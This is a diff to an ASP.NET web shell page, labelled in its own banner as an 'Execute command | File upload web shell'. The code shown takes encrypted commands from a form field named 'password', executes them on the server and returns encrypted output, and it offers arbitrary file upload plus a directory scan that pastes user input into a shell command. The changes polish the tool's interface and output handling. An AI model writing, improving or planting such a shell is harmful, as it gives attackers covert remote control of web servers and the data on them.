@@ -14,7 +14,7 @@ Functions of the shell:
     void Page_Load(object sender, EventArgs e)
     {
         string cmd = Request.Form["password"];
-        string result = "Simple aspx web shell";
+        string result = "<h3>Execute command | File upload web shell</h3>";
         if(!String.IsNullOrEmpty(cmd))
         {
             result = encrypt(ExcuteCmd(decrypt(cmd, key)), key);
@@ -119,30 +119,34 @@ Functions of the shell:
             {
                 mess.Append("<br/>Fail upload file: " + ex.Message);
             }
-            UploadStatusLabel.Text = mess.ToString();
+            UploadStatusLabel.Text = Server.HtmlEncode(mess.ToString());
         }
 
     }
 
     protected void btnscan_Click(object sender, EventArgs e)
     {
-        String s = ExcuteCmd("dir" + @FileLocation.Text);
-        UploadStatusLabel.Text = s;
+        String s = ExcuteCmd("dir " + @FileLocation.Text);
+        UploadStatusLabel.Text = Server.HtmlEncode(s);
     }
 
 </script>
 <html>
-    <head>Shell file upload</head>
-    <form id="form_file_upload" runat="server" method="post">
+    <body>
+        <form id="form_file_upload" runat="server" method="post">
         <div>
-            <asp:FileUpload ID="FileUpload1" runat="server" /><br />
-            <asp:TextBox id="FileLocation" runat="server" placeholder="Directory path"/>
+            File: <asp:FileUpload ID="FileUpload1" runat="server" /><br />
+            Directory: <asp:TextBox id="FileLocation" runat="server" placeholder="Leave blank for current dir"/>
             <br />
-            <asp:Button ID="btnsave" runat="server" onclick="btnsave_Click" 
-                Text="Save" style="width: 85px" /> <br />
+            Submit: <asp:Button ID="btnsave" runat="server" onclick="btnsave_Click" 
+                Text="Upload file" Width="121px" />
             <asp:Button ID="btnscan" runat="server" onclick="btnscan_Click" 
-                Text="Scan Given Directory" Width="203px" /> <br />
-            <asp:TextBox TextMode="Multiline" Width="40%" Wrap="True"  id="UploadStatusLabel" runat="server"/>
+                Text="Scan Given Directory" Width="204px" /> <br />
+            <br /><br />
+        <asp:Label Text="Scan Result" runat="server" /><br />   
+        <asp:TextBox TextMode="Multiline" Width="40%" Height="60%" Wrap="True"  id="UploadStatusLabel" runat="server"/>
         </div>
+        
     </form>
+    </body>
 </html>
